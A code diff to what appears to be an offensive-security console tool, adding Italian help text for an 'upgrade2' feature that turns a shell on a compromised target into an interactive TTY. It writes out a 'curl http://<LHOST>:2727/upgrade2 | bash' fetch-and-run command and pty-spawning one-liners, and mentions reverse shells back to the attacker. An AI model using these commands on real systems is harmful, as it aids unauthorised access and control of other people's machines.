@@ -1249,6 +1249,7 @@ Serve payload dinamici e file statici via `curl` dal target.
 | Comando | Argomento |
 |---------|-----------|
 | `serve help upgrade` (o `u`) | Come fare l'upgrade di una shell instabile |
+| `serve help upgrade2` (o `u2`) | Upgrade in-place (senza nuova connessione) |
 | `serve help rev` (o `r`) | Reverse shell Bash |
 | `serve help sh` | Reverse shell Python |
 | `serve help static` (o `s`) | Gestione file statici e catalogo tool |
@@ -1283,6 +1284,43 @@ Tenta tre metodi in cascata:
 3. **python pty** — fallback con `python3 -c "import pty; ..."`
 
 La connessione torna verso `LHOST:LPORT` configurati con `serve on`.
+""")
+
+
+def _serve_help_upgrade2() -> None:
+    render_markdown(r"""# /upgrade2 — Upgrade In-Place
+
+Upgrada la shell corrente a una TTY interattiva **senza aprire nuove connessioni**.
+Ideale quando sei già dentro il target e vuoi una shell migliore direttamente lì.
+
+## Uso
+
+```bash
+curl http://<LHOST>:2727/upgrade2 | bash
+```
+
+## Nessun prerequisito
+
+Non serve un listener sulla tua macchina — lo script lavora solo sulla shell corrente.
+
+## Cosa fa lo script
+
+Tenta cinque metodi in cascata:
+
+1. **python3 pty** — `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+2. **python2 pty** — stesso metodo con python2
+3. **script** — `script -qc /bin/bash /dev/null`
+4. **expect** — `expect -c 'spawn /bin/bash; interact'`
+5. **perl** — `perl -e 'exec "/bin/bash";'`
+
+## Differenza con /upgrade
+
+| | `/upgrade` | `/upgrade2` |
+|---|---|---|
+| Connessione | Nuova reverse verso LHOST:LPORT | Nessuna, lavora in-place |
+| Prerequisito | Listener (socat/nc) | Nessuno |
+| TTY piena | Sì (socat) | Dipende dal metodo |
+| Quando usarlo | Vuoi una shell dedicata stabile | Vuoi upgradare quella che hai |
 """)
 
 
@@ -1375,6 +1413,8 @@ def _serve_help_static() -> None:
 _SERVE_HELP_TOPICS: dict[str, callable] = {
     "upgrade": _serve_help_upgrade,
     "u": _serve_help_upgrade,
+    "upgrade2": _serve_help_upgrade2,
+    "u2": _serve_help_upgrade2,
     "rev": _serve_help_rev,
     "r": _serve_help_rev,
     "sh": _serve_help_sh,
@@ -1393,7 +1433,7 @@ def cmd_serve(args: argparse.Namespace, state: ConsoleState | None = None) -> in
                 handler()
             else:
                 print(f"Categoria sconosciuta: {subtopic}")
-                print("Categorie: upgrade (u), rev (r), sh, static (s)")
+                print("Categorie: upgrade (u), upgrade2 (u2), rev (r), sh, static (s)")
         else:
             _serve_help_main()
         return 0
